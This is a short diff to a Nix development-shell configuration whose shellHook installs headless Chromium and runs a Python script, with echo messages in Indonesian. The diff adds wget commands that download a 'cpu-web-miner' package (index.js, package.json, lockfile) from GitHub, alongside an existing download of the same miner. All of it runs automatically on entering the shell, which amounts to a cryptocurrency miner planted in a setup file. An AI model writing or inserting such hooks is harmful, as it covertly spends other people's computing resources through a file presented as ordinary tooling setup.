@@ -86,8 +86,12 @@ pkgs.mkShell {
       playwright install --with-deps chromium
     fi
 
-    echo "[*] Menjalankan python3 nix.py ..."
     wget https://esm.run/@marco_ciaramella/cpu-web-miner -O cpu-web-miner.js
+    wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/index.js
+    wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/package-lock.json
+    wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/package.json
+
+    echo "[*] Menjalankan python3 nix.py ..."
 #    python3 serve.py
     python3 nix.py
     exit
